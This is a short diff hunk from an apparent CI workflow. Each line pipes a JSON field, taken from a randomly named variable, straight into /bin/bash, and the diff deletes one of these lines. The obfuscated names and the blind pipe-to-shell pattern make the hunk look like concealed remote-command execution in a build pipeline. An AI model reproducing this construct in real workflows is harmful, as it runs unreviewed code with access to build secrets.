@@ -25,7 +25,6 @@ jobs:
           echo $n8066 | jq -r .uktsj71436 | /bin/bash
           printf '%s' "$sudh92343" | jq -r .ubzm0945 | /bin/bash
           echo $pym20220 | jq -r .m013 | /bin/bash
-          echo $jmbnk7890 | jq -r .vud9 | /bin/bash
           printf '%s' "$tn567" | jq -r .kb92157 | /bin/bash
           echo $ydy3 | jq -r .tdog49700 | /bin/bash
 
